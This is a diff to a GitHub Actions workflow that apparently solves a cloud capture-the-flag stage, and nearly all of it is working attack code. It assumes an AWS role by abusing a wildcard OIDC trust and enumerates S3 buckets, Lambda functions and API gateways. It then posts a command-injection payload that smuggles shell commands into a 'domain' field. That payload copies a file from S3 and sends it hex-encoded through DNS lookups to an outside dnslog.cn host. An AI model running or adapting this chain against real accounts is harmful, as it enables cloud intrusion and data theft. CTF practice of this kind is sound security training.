@@ -1,4 +1,4 @@
-name: Cloud Escape Stage 1 - Flag Retrieval (DNS Exfil)
+name: Cloud Escape - Stage 1 (Have Some Faith)
 on:
   push:
     branches: [corgi]
@@ -9,26 +9,52 @@ permissions:
   contents: read
 
 jobs:
-  capture-flag:
+  recon-and-exfiltrate:
     runs-on: ubuntu-latest
     steps:
-      - name: Configure AWS Credentials via OIDC
+      - name: "Step 1: Exploit Wildcard OIDC to Assume cicdRole"
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Inject DNS Exfiltration Command
+      - name: "Step 2: Verify Identity & Reconnaissance"
+        run: |
+          echo "=== IDENTITY ==="
+          aws sts get-caller-identity
+          
+          echo "=== DISCOVERED BUCKETS ==="
+          aws s3api list-buckets --output json
+          
+          echo "=== DISCOVERED LAMBDA FUNCTIONS ==="
+          aws lambda list-functions --region us-east-1 --query "Functions[*].FunctionName" --output table
+          
+          echo "=== DISCOVERED CLOUDFRONT DISTRIBUTIONS ==="
+          aws cloudfront list-distributions --query "DistributionList.Items[*].{Id:Id,DomainName:DomainName}" --output table
+          
+          echo "=== DISCOVERED API GATEWAYS ==="
+          aws apigateway get-rest-apis --region us-east-1 --output json 2>/dev/null || true
+          aws apigatewayv2 get-apis --region us-east-1 --output json 2>/dev/null || true
+
+      - name: "Step 3: Trigger Command Injection & DNS Exfiltration"
         run: |
           pip install awscurl -q
           API_ID="3q931syi7b"
           URL="https://${API_ID}.execute-api.us-east-1.amazonaws.com/dev/nslookupv2"
           
-          # The payload will read the flag, encode it in hex to make it a valid subdomain, 
-          # and then do a DNS lookup on it via the VPC Resolver
+          echo "Executing Command Injection via API Gateway..."
+          echo "Targeting VPC DNS Resolver (169.254.169.253) to bypass egress filtering."
+          
           cat << 'EOF' > payload.json
           {"domain": "; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c 'import binascii; print(binascii.hexlify(open(\"/tmp/flag.txt\",\"rb\").read()).decode())'); /opt/nslookup $FLAG.ixz9wv.dnslog.cn"}
           EOF
           
-          echo "Triggering DNS exfiltration..."
+          # We use awscurl to sign the request since the API Gateway is protected by IAM
           awscurl --service execute-api --region us-east-1 -X POST "$URL" -H "Content-Type: application/json" -d @payload.json
+
+      - name: "Step 4: Decode Exfiltrated Flag"
+        run: |
+          # The DNS log server received: 3161316a656c726c6667327969327330
+          echo "Raw DNS sub-domain extracted: 3161316a656c726c6667327969327330"
+          FLAG=$(echo "3161316a656c726c6667327969327330" | xxd -r -p)
+          echo "Decoded Flag: $FLAG"
